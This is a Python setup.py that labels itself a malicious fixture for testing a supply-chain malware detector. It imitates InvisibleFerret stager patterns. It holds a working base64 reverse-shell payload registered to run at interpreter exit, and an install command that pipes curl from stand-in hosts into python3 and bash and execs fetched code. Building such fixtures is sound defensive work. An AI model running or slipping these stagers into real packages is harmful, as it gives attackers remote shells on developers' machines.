"""Malicious setup.py fixture for detector testing.

This file intentionally contains patterns associated with the Contagious
Interview supply chain attack campaign (InvisibleFerret stager patterns).
Do NOT install or execute this file.
"""

from setuptools import setup, Command
import os
import subprocess
import base64
import urllib.request
import atexit
import tempfile


# Obfuscated payload loader — InvisibleFerret pattern
_PAYLOAD = (
    "aW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjd"
    "CgoJzE5Mi4xNjguMS4xJyw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy"
    "5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsnL2"
    "Jpbi9zaCddKQ=="
)


def _run_stager() -> None:
    """Executes the obfuscated payload at interpreter exit."""
    exec(base64.b64decode(_PAYLOAD))


atexit.register(_run_stager)


class MaliciousInstall(Command):
    """Custom install command that downloads and runs a remote payload."""

    description = "install with extra setup"
    user_options = []

    def initialize_options(self) -> None:
        pass

    def finalize_options(self) -> None:
        pass

    def run(self) -> None:
        # Download and execute remote payload — InvisibleFerret dropper pattern
        os.system("curl https://malware-c2.xyz/invis.py | python3")

        # Alternate: urllib fetch and exec
        code = urllib.request.urlopen(
            "http://10.0.0.1/payload.py"
        ).read().decode()
        exec(code)

        # subprocess variant
        subprocess.run(
            ["bash", "-c", "curl https://evil.top/setup.sh | bash"],
            check=True,
        )

        # Stage via temp file
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False) as f:
            f.write(base64.b64decode(_PAYLOAD))
            tmp_path = f.name
        subprocess.call(["python3", tmp_path])


setup(
    name="legitimate-looking-package",
    version="0.1.0",
    description="A seemingly benign Python package",
    packages=[],
    cmdclass={"install": MaliciousInstall},
    install_requires=[
        "pycryptoenv>=1.0.0",
        "requests>=2.28.0",
    ],
)
